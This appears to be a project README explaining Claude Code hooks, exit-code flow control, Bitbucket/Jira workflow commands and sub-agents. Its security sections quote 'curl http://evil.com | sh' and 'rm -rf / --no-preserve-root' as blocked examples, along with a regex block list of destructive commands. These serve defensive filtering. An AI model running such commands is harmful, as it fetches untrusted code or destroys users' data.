# Claude Code Hooks Mastery

[Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about [Claude Code Sub-Agents](#claude-code-sub-agents) and the powerful [Meta-Agent](#the-meta-agent).

<img src="images/hooked.png" alt="Claude Code Hooks" style="max-width: 800px; width: 100%;" />

## Prerequisites

This requires:
- **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver
- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's CLI for Claude AI

Optional:
- **[ElevenLabs](https://elevenlabs.io/)** - Text-to-speech provider (with MCP server integration)
- **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - MCP server for ElevenLabs
- **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping and crawling MCP server (my favorite scraper)
- **[OpenAI](https://openai.com/)** - Language model provider + Text-to-speech provider
- **[Anthropic](https://www.anthropic.com/)** - Language model provider

## Hook Lifecycle & Payloads

This demo captures all 8 Claude Code hook lifecycle events with their JSON payloads:

### 1. UserPromptSubmit Hook
**Fires:** Immediately when user submits a prompt (before Claude processes it)  
**Payload:** `prompt` text, `session_id`, timestamp  
**Enhanced:** Prompt validation, logging, context injection, security filtering

### 2. PreToolUse Hook
**Fires:** Before any tool execution  
**Payload:** `tool_name`, `tool_input` parameters  
**Enhanced:** Blocks dangerous commands (`rm -rf`, `.env` access)

### 3. PostToolUse Hook  
**Fires:** After successful tool completion  
**Payload:** `tool_name`, `tool_input`, `tool_response` with results

### 4. Notification Hook
**Fires:** When Claude Code sends notifications (waiting for input, etc.)  
**Payload:** `message` content  
**Enhanced:** TTS alerts - "Your agent needs your input" (30% chance includes name)

### 5. Stop Hook
**Fires:** When Claude Code finishes responding  
**Payload:** `stop_hook_active` boolean flag  
**Enhanced:** AI-generated completion messages with TTS playback

### 6. SubagentStop Hook
**Fires:** When Claude Code subagents (Task tools) finish responding  
**Payload:** `stop_hook_active` boolean flag  
**Enhanced:** TTS playback - "Subagent Complete"

### 7. PreCompact Hook
**Fires:** Before Claude Code performs a compaction operation  
**Payload:** `trigger` ("manual" or "auto"), `custom_instructions` (for manual), session info  
**Enhanced:** Transcript backup, verbose feedback for manual compaction

### 8. SessionStart Hook
**Fires:** When Claude Code starts a new session or resumes an existing one  
**Payload:** `source` ("startup", "resume", or "clear"), session info  
**Enhanced:** Development context loading (git status, recent issues, context files)

## What This Shows

- **Complete hook lifecycle coverage** - All 8 hook events implemented and logging
- **Prompt-level control** - UserPromptSubmit validates and enhances prompts before Claude sees them
- **Intelligent TTS system** - AI-generated audio feedback with voice priority (ElevenLabs > OpenAI > pyttsx3)
- **Security enhancements** - Blocks dangerous commands and sensitive file access at multiple levels
- **Personalized experience** - Uses engineer name from environment variables
- **Automatic logging** - All hook events are logged as JSON to `logs/` directory  
- **Chat transcript extraction** - PostToolUse hook converts JSONL transcripts to readable JSON format

> **Warning:** The `chat.json` file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.

## UV Single-File Scripts Architecture

This project leverages **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** to keep hook logic cleanly separated from your main codebase. All hooks live in `.claude/hooks/` as standalone Python scripts with embedded dependency declarations.

**Benefits:**
- **Isolation** - Hook logic stays separate from your project dependencies
- **Portability** - Each hook script declares its own dependencies inline
- **No Virtual Environment Management** - UV handles dependencies automatically
- **Fast Execution** - UV's dependency resolution is lightning-fast
- **Self-Contained** - Each hook can be understood and modified independently

This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.

## Key Files

- `.claude/settings.json` - Hook configuration with permissions
- `.claude/hooks/` - Python scripts using uv for each hook type
  - `user_prompt_submit.py` - Prompt validation, logging, and context injection
  - `pre_tool_use.py` - Security blocking and logging
  - `post_tool_use.py` - Logging and transcript conversion
  - `notification.py` - Logging with optional TTS (--notify flag)
  - `stop.py` - AI-generated completion messages with TTS
  - `subagent_stop.py` - Simple "Subagent Complete" TTS
  - `pre_compact.py` - Transcript backup and compaction logging
  - `session_start.py` - Development context loading and session logging
  - `utils/` - Intelligent TTS and LLM utility scripts
    - `tts/` - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3)
    - `llm/` - Language model integrations (OpenAI, Anthropic)
  - `scripts/bitbucket/` - Bitbucket API integration scripts
    - `bitbucket_utils.py` - Core utilities with authentication, caching, and retry logic
    - `bitbucket_pr_api.py` - PR creation workflow with branch management
    - `pr_status_api.py` - PR status monitoring and review tracking
    - `jira_code_review.py` - Jira code review ticket preparation
- `.claude/commands/` - Custom slash commands for streamlined workflows
  - `bitbucket-pr.md` - Automated Bitbucket PR creation with Jira code review ticket integration
  - `create-code-review-ticket.md` - Standalone Jira code review ticket creation
  - `pr-status.md` - Check PR status, reviews, comments, and linked Jira tickets
  - `bitbucket-pr-api.md` - Hybrid PR creation using direct API
  - `pr-status-api.md` - Hybrid PR status monitoring
  - `jira-code-review.md` - Hybrid Jira ticket creation for existing PRs
- `logs/` - JSON logs of all hook executions
  - `user_prompt_submit.json` - User prompt submissions with validation
  - `pre_tool_use.json` - Tool use events with security blocking
  - `post_tool_use.json` - Tool completion events
  - `notification.json` - Notification events
  - `stop.json` - Stop events with completion messages
  - `subagent_stop.json` - Subagent completion events
  - `pre_compact.json` - Pre-compaction events with trigger type
  - `session_start.json` - Session start events with source type
  - `chat.json` - Readable conversation transcript (generated by --chat flag)
- `ai_docs/cc_hooks_docs.md` - Complete hooks documentation from Anthropic
- `ai_docs/user_prompt_submit_hook.md` - Comprehensive UserPromptSubmit hook documentation

Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.

## Features Demonstrated

- Prompt validation and security filtering
- Context injection for enhanced AI responses
- Command logging and auditing
- Automatic transcript conversion  
- Permission-based tool access control
- Error handling in hook execution
- **Automated Bitbucket workflows** - Streamlined PR creation with proper branch naming
- **Code review ticket integration** - Automated ticket generation for production branches

Run any Claude Code command to see hooks in action via the `logs/` files.

### New Bitbucket Workflow Commands

#### `/bitbucket-pr` - Create Pull Requests with Automated Jira Code Review Tickets
```bash
# Usage examples:
/bitbucket-pr development 123 @reviewer1,@reviewer2
/bitbucket-pr main 456 --jira-project PROJ              # With specific Jira project
/bitbucket-pr feature-branch 789 @team                  # Team review
```

**Features:**
- Automatic branch naming (`{destination}-{ticket-number}`)
- Git status and diff collection
- PR creation with proper metadata and reviewer assignment
- **🎫 Automated Jira code review ticket creation** for production branches
- Ticket follows exact specifications:
  - Type: Task, Component: Code Review, Story Points: 1
  - Title: `{repo} {branch-name} Code Review`
  - Description: Link to PR
- Comprehensive status reporting with PR and Jira ticket URLs

#### `/create-code-review-ticket` - Standalone Jira Ticket Creation
```bash
# Usage examples:
/create-code-review-ticket https://bitbucket.org/workspace/repo/pull-requests/123
/create-code-review-ticket https://bitbucket.org/workspace/repo/pull-requests/123 development-456 --jira-project PROJ
/create-code-review-ticket https://bitbucket.org/workspace/repo/pull-requests/123 --assignee john.doe@company.com
```

**Features:**
- Create Jira code review tickets for existing PRs
- Follows exact ticket format specifications
- Auto-detects repository and branch information
- Optional assignee and project specification
- Error handling with manual creation fallback

#### `/pr-status` - Check Pull Request Status with Jira Integration
```bash
# Usage examples:
/pr-status                    # List recent PRs
/pr-status 123               # Check specific PR
/pr-status 123 --comments    # Include comments
/pr-status 123 --jira        # Include linked Jira tickets
```

**Features:**
- PR status and review progress with visual indicators
- Reviewer status tracking
- Comment threading and organization
- **🎫 Jira ticket integration** - Shows linked code review tickets
- Branch relationship detection
- Formatted status output with actionable insights

### New Hybrid API Commands (Phase 3-4 Implementation)

These commands use the Bitbucket API directly (via Python scripts) while maintaining Atlassian MCP server integration for Jira operations, providing better performance and reliability.

#### `/bitbucket-pr-api` - Enhanced PR Creation with Direct API
```bash
# Usage examples:
/bitbucket-pr-api development 123 @reviewer1,@reviewer2
/bitbucket-pr-api main 456 --draft --title "Custom Title"
/bitbucket-pr-api release 789 --jira-project PROJ
```

**Features:**
- **Direct Bitbucket API integration** - No MCP server dependency for Bitbucket
- **API token priority** - Prefers API tokens over app passwords
- Automatic branch creation and management
- Custom PR titles and draft PR support
- **Hybrid Jira integration** - Uses MCP for code review tickets on production branches

#### `/pr-status-api` - Enhanced PR Status Monitoring
```bash
# Usage examples:
/pr-status-api                    # List all open PRs
/pr-status-api 123                # Check specific PR
/pr-status-api 123 --comments     # Include comments
/pr-status-api --jira             # Search for linked Jira tickets
/pr-status-api --all              # Show all PR states
```

**Features:**
- **Direct API access** - Faster response times
- Comprehensive PR listing with review status
- Detailed PR view with participant information
- Comment retrieval and formatting
- **Optional Jira search** - Uses MCP to find linked tickets
- Multiple PR state filtering

#### `/jira-code-review` - Standalone Code Review Ticket Creation
```bash
# Usage examples:
/jira-code-review https://bitbucket.org/workspace/repo/pull-requests/123
/jira-code-review <pr-url> --project PROJ --assignee john.doe
/jira-code-review <pr-url> --branch feature-auth
```

**Features:**
- **Standalone ticket creation** - Create code review tickets for existing PRs
- Automatic PR information extraction
- Standard ticket format (Task, Code Review component, 1 story point)
- **MCP-based Jira integration** - Full Atlassian server capabilities
- Assignee lookup and assignment

### Bitbucket API Configuration

The hybrid commands require Bitbucket API credentials in your `.env` file:

```bash
# Bitbucket API Configuration (for hybrid commands)
BITBUCKET_USERNAME=your_username
BITBUCKET_WORKSPACE=your_workspace

# Authentication (API token preferred, app password as fallback)
BITBUCKET_API_TOKEN=your_api_token_here      # Recommended
BITBUCKET_APP_PASSWORD=your_app_password_here # Fallback option
```

**Authentication Priority:**
1. API Token (if `BITBUCKET_API_TOKEN` is set)
2. App Password (if `BITBUCKET_APP_PASSWORD` is set)
3. Error if neither is configured

## Hook Error Codes & Flow Control

Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.

### Exit Code Behavior

Hooks communicate status and control flow through exit codes:

| Exit Code | Behavior           | Description                                                                                  |
| --------- | ------------------ | -------------------------------------------------------------------------------------------- |
| **0**     | Success            | Hook executed successfully. `stdout` shown to user in transcript mode (Ctrl-R)               |
| **2**     | Blocking Error     | **Critical**: `stderr` is fed back to Claude automatically. See hook-specific behavior below |
| **Other** | Non-blocking Error | `stderr` shown to user, execution continues normally                                         |

### Hook-Specific Flow Control

Each hook type has different capabilities for blocking and controlling Claude Code's behavior:

#### UserPromptSubmit Hook - **CAN BLOCK PROMPTS & ADD CONTEXT**
- **Primary Control Point**: Intercepts user prompts before Claude processes them
- **Exit Code 2 Behavior**: Blocks the prompt entirely, shows error message to user
- **Use Cases**: Prompt validation, security filtering, context injection, audit logging
- **Example**: Our `user_prompt_submit.py` logs all prompts and can validate them

#### PreToolUse Hook - **CAN BLOCK TOOL EXECUTION**
- **Primary Control Point**: Intercepts tool calls before they execute
- **Exit Code 2 Behavior**: Blocks the tool call entirely, shows error message to Claude
- **Use Cases**: Security validation, parameter checking, dangerous command prevention
- **Example**: Our `pre_tool_use.py` blocks `rm -rf` commands with exit code 2

```python
# Block dangerous commands
if is_dangerous_rm_command(command):
    print("BLOCKED: Dangerous rm command detected", file=sys.stderr)
    sys.exit(2)  # Blocks tool call, shows error to Claude
```

#### PostToolUse Hook - **CANNOT BLOCK (Tool Already Executed)**
- **Primary Control Point**: Provides feedback after tool completion
- **Exit Code 2 Behavior**: Shows error to Claude (tool already ran, cannot be undone)
- **Use Cases**: Validation of results, formatting, cleanup, logging
- **Limitation**: Cannot prevent tool execution since it fires after completion

#### Notification Hook - **CANNOT BLOCK**
- **Primary Control Point**: Handles Claude Code notifications
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Custom notifications, logging, user alerts
- **Limitation**: Cannot control Claude Code behavior, purely informational

#### Stop Hook - **CAN BLOCK STOPPING**
- **Primary Control Point**: Intercepts when Claude Code tries to finish responding
- **Exit Code 2 Behavior**: Blocks stoppage, shows error to Claude (forces continuation)
- **Use Cases**: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION
- **Caution**: Can cause infinite loops if not properly controlled

#### SubagentStop Hook - **CAN BLOCK SUBAGENT STOPPING**
- **Primary Control Point**: Intercepts when Claude Code subagents try to finish
- **Exit Code 2 Behavior**: Blocks subagent stoppage, shows error to subagent
- **Use Cases**: Ensuring subagent tasks complete properly
- **Example**: Our `subagent_stop.py` logs events and announces completion

#### PreCompact Hook - **CANNOT BLOCK**
- **Primary Control Point**: Fires before compaction operations
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Transcript backup, context preservation, pre-compaction logging
- **Example**: Our `pre_compact.py` creates transcript backups before compaction

#### SessionStart Hook - **CANNOT BLOCK**
- **Primary Control Point**: Fires when new sessions start or resume
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Loading development context, session initialization, environment setup
- **Example**: Our `session_start.py` loads git status, recent issues, and context files

### Advanced JSON Output Control

Beyond simple exit codes, hooks can return structured JSON for sophisticated control:

#### Common JSON Fields (All Hook Types)
```json
{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
```

#### PreToolUse Decision Control
```json
{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"approve"**: Bypasses permission system, `reason` shown to user
- **"block"**: Prevents tool execution, `reason` shown to Claude
- **undefined**: Normal permission flow, `reason` ignored

#### PostToolUse Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"block"**: Automatically prompts Claude with `reason`
- **undefined**: No action, `reason` ignored

#### Stop Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
```

- **"block"**: Prevents Claude from stopping, `reason` tells Claude how to proceed
- **undefined**: Allows normal stopping, `reason` ignored

### Flow Control Priority

When multiple control mechanisms are used, they follow this priority:

1. **`"continue": false`** - Takes precedence over all other controls
2. **`"decision": "block"`** - Hook-specific blocking behavior
3. **Exit Code 2** - Simple blocking via stderr
4. **Other Exit Codes** - Non-blocking errors

### Security Implementation Examples

#### 1. Command Validation (PreToolUse)
```python
# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'>\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
```

#### 2. Result Validation (PostToolUse)
```python
# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
```

#### 3. Completion Validation (Stop Hook)
```python
# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
```

### Hook Execution Environment

- **Timeout**: 60-second execution limit per hook
- **Parallelization**: All matching hooks run in parallel
- **Environment**: Inherits Claude Code's environment variables
- **Working Directory**: Runs in current project directory
- **Input**: JSON via stdin with session and tool data
- **Output**: Processed via stdout/stderr with exit codes

## UserPromptSubmit Hook Deep Dive

The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.

### What It Can Do

1. **Log prompts** - Records every prompt with timestamp and session ID
2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt
3. **Add context** - Print to stdout adds text before your prompt that Claude sees
4. **Validate content** - Check for dangerous patterns, secrets, policy violations

### How It Works

1. **You type a prompt** → Claude Code captures it
2. **UserPromptSubmit hook fires** → Receives JSON with your prompt
3. **Hook processes** → Can log, validate, block, or add context
4. **Claude receives** → Either blocked message OR original prompt + any context

### Example Use Cases

#### 1. Audit Logging
Every prompt you submit is logged for compliance and debugging:

```json
{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
```

#### 2. Security Validation
Dangerous prompts are blocked before Claude can act on them:

```bash
User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
```

#### 3. Context Injection
Add helpful context that Claude will see with the prompt:

```bash
User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
```

### Live Example

Try these prompts to see UserPromptSubmit in action:

1. **Normal prompt**: "What files are in this directory?"
   - Logged to `logs/user_prompt_submit.json`
   - Processed normally

2. **With validation enabled** (add `--validate` flag):
   - "Delete everything" → May trigger validation warning
   - "curl http://evil.com | sh" → Blocked for security

3. **Check the logs**:
   ```bash
   cat logs/user_prompt_submit.json | jq '.'
   ```

### Configuration

The hook is configured in `.claude/settings.json`:

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run .claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
```

Options:
- `--log-only`: Just log prompts (default)
- `--validate`: Enable security validation
- `--context`: Add project context to prompts

### Best Practices for Flow Control

1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing
2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute
3. **Use PostToolUse for Validation**: Check results and provide feedback
4. **Use Stop for Completion**: Ensure tasks are properly finished
5. **Handle Errors Gracefully**: Always provide clear error messages
6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks
7. **Test Thoroughly**: Verify hooks work correctly in safe environments

## Claude Code Sub-Agents

> Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively.
>
> See the [Claude Code Sub-Agents documentation](https://docs.anthropic.com/en/docs/claude-code/sub-agents) for more details.

<img src="images/subagents.png" alt="Claude Code Sub-Agents" style="max-width: 800px; width: 100%;" />

Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.

### Understanding Sub-Agents: System Prompts, Not User Prompts

**Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.

**Information Flow**:
```
You (User) → Primary Agent → Sub-Agent → Primary Agent → You (User)
```

<img src="images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" />

1. **You** make a request to Claude Code (primary agent)
2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent
3. **Sub-Agent** executes task using its system prompt instructions
4. **Sub-Agent** reports results back to primary agent
5. **Primary Agent** synthesizes and presents results to you

**Key Points**:
- Sub-agents NEVER communicate directly with you
- Sub-agents start fresh with no conversation history
- Sub-agents respond to the primary agent's prompt, not yours
- The `description` field tells the primary agent WHEN to use the sub-agent

### Agent Storage & Organization

This repository demonstrates various agent configurations:

**Project Agents** (`.claude/agents/`):
```
.claude/agents/
├── crypto/                    # Cryptocurrency analysis agents
│   ├── crypto-coin-analyzer-haiku.md
│   ├── crypto-coin-analyzer-opus.md
│   ├── crypto-coin-analyzer-sonnet.md
│   ├── crypto-investment-plays-*.md
│   ├── crypto-market-agent-*.md
│   ├── crypto-movers-haiku.md
│   └── macro-crypto-correlation-scanner-*.md
├── hello-world-agent.md       # Simple greeting agent
├── llm-ai-agents-and-eng-research.md  # AI research specialist
├── meta-agent.md              # Agent that creates agents
└── work-completion-summary.md # Audio summary generator
```

**Storage Hierarchy**:
- **Project agents**: `.claude/agents/` (higher priority, project-specific)
- **User agents**: `~/.claude/agents/` (lower priority, available across all projects)
- **Format**: Markdown files with YAML frontmatter

**Agent File Structure:**
```yaml
---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
```

Sub-agents enable:
- **Task specialization** - Code reviewers, debuggers, test runners
- **Context preservation** - Each agent operates independently  
- **Tool restrictions** - Grant only necessary permissions
- **Automatic delegation** - Claude proactively uses the right agent

### Key Engineering Insights

**Two Critical Mistakes to Avoid:**

1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent.

2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.

**Best Practices:**
- Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents
- Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions
- Remember sub-agents start fresh with no context - be explicit about what they need to know
- Follow Problem → Solution → Technology approach when building agents

### Complex Workflows & Agent Chaining

Claude Code can intelligently chain multiple sub-agents together for complex tasks:

<img src="images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" />

For example:
- "First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"
- "Use the debugger agent to fix errors, then have the code-reviewer check the changes"
- "Generate a new agent with meta-agent, then test it on a specific task"

This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.

### The Meta-Agent

The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.

**Why Meta-Agent Matters:**
- **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours
- **Consistent Structure** - Ensures all agents follow best practices and proper formatting
- **Live Documentation** - Pulls latest Claude Code docs to stay current with features
- **Intelligent Tool Selection** - Automatically determines minimal tool requirements

**Using the Meta-Agent:**
```bash
# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
```

The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.

## Master AI Coding
> And prepare for Agentic Engineering

Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=ccsubagents)

Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks.